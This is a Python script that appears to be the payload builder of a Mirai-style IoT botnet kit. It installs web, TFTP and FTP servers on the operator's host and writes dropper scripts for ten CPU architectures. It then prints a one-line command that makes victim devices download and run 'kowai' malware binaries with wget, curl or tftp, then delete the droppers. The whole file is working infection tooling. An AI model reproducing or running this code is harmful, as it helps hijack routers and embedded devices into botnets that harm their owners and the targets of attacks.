import subprocess, sys, urllib, time
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "NIggA"
exec_name = "MikroTik"
bin_prefix = "kowai."
bin_directory = "bins"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;37m[CC] Installing Required Applets For Payload")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37m[CC] Creating SH Files For Payload")
time.sleep(3)
run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/t8UsA2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "#!/bin/bash" > /var/www/html/8UsA.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/t8UsA2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/t8UsA2.sh')
for i in archs:
    run('echo "cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'.wget.'+i+'" >> /var/www/html/8UsA.sh')
    run('echo "cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'.tftp.'+i+'" >> /var/lib/tftpboot/t8UsA.sh')
    run('echo "cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'.tftp.'+i+'" >> /var/lib/tftpboot/t8UsA2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37mBUIDLING YOUR MIPS...")
time.sleep(3)
print("\x1b[0;37m[CC] Payload Created")
complete_payload = ("cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; wget http://" + ip + "/8UsA.sh; curl -O http://" + ip + "/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp " + ip + " -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g " + ip + "; chmod 777 t8UsA2.sh; sh t8UsA2.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh")
f = open("payload.txt","w+")
f.write(complete_payload)
f.close()
print("PAYLOAD ~> ["+complete_payload+"]")
